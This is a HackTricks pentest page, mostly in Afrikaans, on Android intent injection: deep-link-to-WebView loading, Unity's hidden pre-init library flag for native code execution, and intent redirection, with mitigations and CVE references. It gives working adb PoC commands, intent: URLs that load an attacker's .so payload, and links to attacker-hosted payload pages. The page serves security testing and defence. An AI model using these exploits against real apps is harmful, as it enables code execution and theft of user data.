# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection misbruik komponente wat deur 'n aanvaller beheerde Intents aanvaar of data wat later in Intents omskep word. Twee baie algemene patrone tydens Android app pentests is:

- Passing crafted extras to exported Activities/Services/BroadcastReceivers that are later forwarded to privileged, non-exported components.
- Triggering exported VIEW/BROWSABLE deep links that forward attacker-controlled URLs into internal WebViews or other sensitive sinks.

## Deep links → WebView sink (URL parameter injection)

If an app exposes a custom scheme deep link such as:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
en as die ontvangende Activity die `url`-navraagparameter na 'n WebView deurstuur, kan jy die app dwing om arbitrêre eksterne inhoud in sy eie WebView-konteks te vertoon.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Invloed
- HTML/JS voer binne die app se WebView-profiel uit.
- As JavaScript geaktiveer is (standaard of as gevolg van verkeerd-geskikte kontroles), kan jy enige blootgestelde `@JavascriptInterface` objekte opnoem/gebruik, WebView-koekies/lokale stoor steel, en pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Volgorde-van-kontroles-bug wat JavaScript aktiveer

'n Herhalende bug is die aktiveer van JavaScript (of ander permissiewe WebView-instellings) voor die finale URL allowlist/verifikasie klaar is. As vroeë helpers jou deep link aanvaar en die WebView eerste gekonfigureer word, gebeur jou finale laai met JavaScript reeds aangeskakel, selfs al is latere kontroles gebrekkig of te laat.

Wat om te soek in gedecompileerde kode:
- Meerdere helpers wat die URL op verskillende maniere parse/split/rebuild (inkonsekwente normalisering).
- Oproepe na `getSettings().setJavaScriptEnabled(true)` voordat die laaste host/path allowlist-kontrole uitgevoer word.
- 'n pipeline soos: parse → partial validate → configure WebView → final verify → loadUrl.

Mitigations
- Maak eenkeer canonies (canonicalize) en valideer streng; faal toe.
- Skakel JavaScript slegs aan nadat alle kontroles slaag en net voordat vertroude inhoud gelaai word.
- Vermy om bridges aan onbetroubare oorspronge bloot te stel.

## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity-gebaseerde Android-apps gebruik tipies `com.unity3d.player.UnityPlayerActivity` (of `UnityPlayerGameActivity`) as die entry Activity. Unity se Android-templaat behandel 'n spesiale Intent extra met die naam `unity` as 'n string van command-line vlagte vir die Unity runtime. Wanneer die entry Activity geëksporteer is (standaard in baie templates), kan enige plaaslike app – en soms 'n webwerf as `BROWSABLE` teenwoordig is – hierdie extra verskaf.

'n Gevaarlike, ongedokumenteerde vlag lei tot native kode-uitvoering tydens baie vroeë proses-initsialisering:

- Verborge vlag: `-xrsdk-pre-init-library <absolute-path>`
- Effek: `dlopen(<absolute-path>, RTLD_NOW)` baie vroeg in init, wat 'n deur-aanvaller-beheerde ELF binne die teiken-app se proses laai met sy UID en toestemmings.

Reverse-engineering-uittreksel (vereenvoudig):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Why it works
- Die Intent-extra `unity` word geïnterpreteer as Unity runtime-vlags.
- Deur die pre-init-vlag te voorsien wys Unity na 'n deur die aanvaller beheerde ELF-pad binne 'n toegelate linker-namespace-pad (sien beperkings hieronder).

Conditions for exploitation
- Die Unity entry Activity is exported (gewoonlik waar as verstek).
- Vir een-klik remote via die blaaier: die entry Activity verklaar ook `android.intent.category.BROWSABLE` sodat extras vanaf 'n `intent:` URL deurgegee kan word.

Local exploitation (same device)
1) Plaas 'n payload ELF op 'n pad wat deur die slagoffer-app gelees kan word. Maklikste: versend 'n kwaadwillige biblioteek in jou eie attacker app en verseker dit word uitgepak onder `/data/app/.../lib/<abi>/` deur in die attacker se manifest te stel:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Start die victim se Unity activity met die CLI pre-init vlag in die `unity` extra. Voorbeeld ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity roep `dlopen("/data/.../libpayload.so", RTLD_NOW)`; jou payload word in die slagoffer-proses uitgevoer, erf al sy app permissions (camera/mic/network/storage, ens.) en toegang tot in-app sessions/data.

Notes
- Die presiese `/data/app/...` pad verskil tussen toestelle/installasies. 'n attacker app kan sy eie native lib dir tydens runtime opvra via `getApplicationInfo().nativeLibraryDir` en dit aan die trigger kommunikeer.
- Die lêer hoef nie op `.so` te eindig nie as dit 'n geldige ELF is — `dlopen()` kyk na ELF headers, nie na uitbreidings nie.

Remote one‑click via browser (conditional)
As die Unity entry-aktiviteit geëksporteer is met `BROWSABLE`, kan 'n webwerf extras via 'n `intent:` URL deurgee:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Op moderne Android blokkeer die dinamiese linker-namespaces en SELinux die laai vanaf baie openbare paaie (bv. `/sdcard/Download`). Jy sal foutboodskappe soos die volgende sien:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Omseilingsstrategie: teiken apps wat aanvaller-beheerde bytes in hulle private stoorplek kas (bv. HTTP caches). Omdat toegelate paaie `/data` en die app’s private dir insluit, kan die wys van `-xrsdk-pre-init-library` na 'n absolute pad binne die app se cache linker constraints bevredig en code execution teweegbring. Dit weerspieël vorige cache-to-ELF RCE patrone wat in ander Android apps ervaar is.


## Ander klassieke Intent injection primitiewe

- startActivity/sendBroadcast wat aanvaller-gelewerde `Intent` extras gebruik wat later her-gepars (`Intent.parseUri(...)`) en uitgevoer word.
- Geëksporteerde proxy-komponente wat Intents deurstuur na nie-geëksporteerde sensitiewe komponente sonder toestemmingskontroles.

---

## Outomatiseer geëksporteerde-komponenttoetsing (Smali-driven ADB generation)

Wanneer geëksporteerde komponente spesifieke extras verwag, lei raai van payload-vorm tot tydverspilling en valse negatiewe. Jy kan die ontdekking van sleutels/tipes direk uit Smali outomatiseer en gereed-om-te-hardloop adb-opdragte genereer.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: decompile and scan Smali for calls like `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` to infer which extras and fields are consumed by each component.
- Output: vir elke geëksporteerde Activity/Service/Receiver/Provider druk die tool 'n kort verduideliking en die presiese `adb shell am ...`/`cmd content ...` opdrag met korrek getipeerde vlagte.

Installeer
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Gebruik
```bash
python apk-components-inspector.py target.apk
```
Voorbeeld-uitset
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras spiekbriefie (tipe-bewuste flags)
- Strings: `--es key value` | String array: `--esa key v1,v2`
- Integers: `--ei key 123` | Int array: `--eia key 1,2,3`
- Booleans: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URIs (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Component extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Common flags: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro-wenke vir Providers
- Gebruik `adb shell cmd content query|insert|update|delete ...` om ContentProviders te bereik sonder agents.
- Vir SQLi-toetsing, varieer `--projection` en `--where` (aka selection) wanneer die onderliggende provider op SQLite gebaseer is.

Volledige pyplyn-outomatisering (interaktiewe executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
Hulpskrip (voeg voortgesette reëls saam, voer slegs reëls uit wat begin met `adb`):
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
Voer op die toestel uit: die inspector is Python-based en werk in Termux of op rooted phones waar `apktool`/`androguard` beskikbaar is.

---

## Intent Redirection (CWE-926) – vind en uitbuit

Patroon
- 'n Exported entry point (Activity/Service/Receiver) lees 'n inkomende Intent en stuur dit intern of ekstern verder sonder om die bron/data te verifieer, bv.:
- `startActivity(getIntent())`
- `startActivity(intent)` waar `intent` van 'n extra gekom het soos `redirect_intent`/`next_intent`/`pending_intent` of `Intent.parseUri(...)`.
- Vertrou op `action`/`data`/`component` velde sonder kontroles; verifieer nie die identiteit van die aanroeper nie.

Wat om te soek in Smali/Java
- Gebruik van `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Direkte `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` op deur 'n aanvaller beïnvloedde Intents.
- Gebrek aan kontroles met `getCallingPackage()`/`getCallingActivity()` of aangepaste toestemmingshekke.

ADB PoC templates
- Proxy Activity wat 'n ekstra Intent aan 'n bevoegde interne Activity deurstuur:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Geëksporteerde Service wat `redirect_intent` parcelable respekteer:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Uitgevoerde Receiver wat herlei sonder validasie:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Vlae nuttig vir singleTask-stylgedrag
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Werklike voorbeelde (impak wissel):
- CVE-2024-26131 (Element Android): exported flows wat lei tot WebView-manipulasie, PIN-omseiling, login hijack.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → stelselvlak-effekte.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): omleiding → arbitêre lêertoegang (met gebruikerinteraksie).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implisiete Intents leak inhoud.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).

Mitigasies (ontwikkelaar-kontrolelys)
- Stuur inkomende Intents nie direk deur nie; sanitiseer en herbou slegs toegelate velde.
- Beperk blootstelling met `android:exported="false"` tensy nodig. Beskerm exported-komponente met permissions en signatures.
- Verifieer roeper-identiteit (`getCallingPackage()`/`getCallingActivity()`), en afdwing eksplisiete Intents vir intra-app navigasie.
- Valideer beide `action` en `data` (scheme/host/path) voor gebruik; vermy `Intent.parseUri` op onbetroubare inset.

---

## Verwysings

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)

{{#include ../../banners/hacktricks-training.md}}
